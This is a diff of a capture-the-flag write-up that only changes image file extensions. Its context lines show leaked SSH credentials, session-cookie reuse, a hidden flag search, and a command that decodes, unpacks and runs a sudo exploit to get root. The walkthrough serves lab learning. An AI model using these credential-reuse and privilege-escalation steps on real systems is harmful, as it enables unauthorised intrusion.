@@ -82,7 +82,7 @@ Username: maya.chen
 Password: Onboard-Maya25!
 ```
 
-![Redis credentials found](/img/posts/kpmg-ctf-2026-19_vodoo_redis_creds.png)
+![Redis credentials found](/img/posts/kpmg-ctf-2026-19_vodoo_redis_creds.webp)
 
 > [!NOTE]
 > The Redis scan also exposed an active session cookie for Maya. Using it as `acme_session` granted portal access as Maya — but the SSH path was the intended route.
@@ -101,7 +101,7 @@ ssh -p 16632 maya.chen@0.cloud.chals.io
 
 The shell confirmed `uid=1000(maya.chen)`. `sudo -l` showed no sudoers permissions.
 
-![SSH login as maya.chen](/img/posts/kpmg-ctf-2026-18_vodoo_ssh_login.png)
+![SSH login as maya.chen](/img/posts/kpmg-ctf-2026-18_vodoo_ssh_login.webp)
 
 Maya's visible home directories (`Documents`, `backups`, `logs`, `scripts`) were dead ends — routine notes and log-rotation scripts. A shallow `find` initially missed the flag. A **recursive** search including hidden directories found it:
 
@@ -123,7 +123,7 @@ cat /home/maya.chen/.local/share/acme-agent/.vault/user.txt
 KPMG_CTF{ArbcuvmYQb9V5XEVOoK2EZoDSNQ4AG9xKm7UdqPalO6n}
 ```
 
-![User flag](/img/posts/kpmg-ctf-2026-20_vodoo_flag1.png)
+![User flag](/img/posts/kpmg-ctf-2026-20_vodoo_flag1.webp)
 
 ---
 
@@ -144,7 +144,7 @@ cat /etc/os-release
 ldd --version | head -1
 ```
 
-![Checking sudo version](/img/posts/kpmg-ctf-2026-21_vodoo_sudo_version.png)
+![Checking sudo version](/img/posts/kpmg-ctf-2026-21_vodoo_sudo_version.webp)
 
 | Component | Version |
 |---|---|
@@ -177,7 +177,7 @@ payload_bytes=$(wc -c < /tmp/ctf-payload.b64)
   "stty -echo; mkdir -p ~/poc; head -c $payload_bytes | base64 -d | tar -xf - -C ~/poc && cd ~/poc && chmod +x exploit && ./exploit"
 ```
 
-![The exploit in action](/img/posts/kpmg-ctf-2026-22_vodoo_exploit.png)
+![The exploit in action](/img/posts/kpmg-ctf-2026-22_vodoo_exploit.webp)
 
 The exploit output confirmed a root shell:
 
@@ -186,7 +186,7 @@ uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)
 /root/root.txt
 ```
 
-![Proof of cleanup](/img/posts/kpmg-ctf-2026-24_vodoo_cleanup.png)
+![Proof of cleanup](/img/posts/kpmg-ctf-2026-24_vodoo_cleanup.webp)
 
 ### Flag 2 (Root)
 
@@ -194,7 +194,7 @@ uid=0(root) gid=0(root) groups=0(root),1000(maya.chen)
 KPMG_CTF{GL6RNzWvKqdYw-N7TntygaK5OTouvCRdRPDiIBxO0eCw}
 ```
 
-![Root flag](/img/posts/kpmg-ctf-2026-23_vodoo_flag2.png)
+![Root flag](/img/posts/kpmg-ctf-2026-23_vodoo_flag2.webp)
 
 ---
 
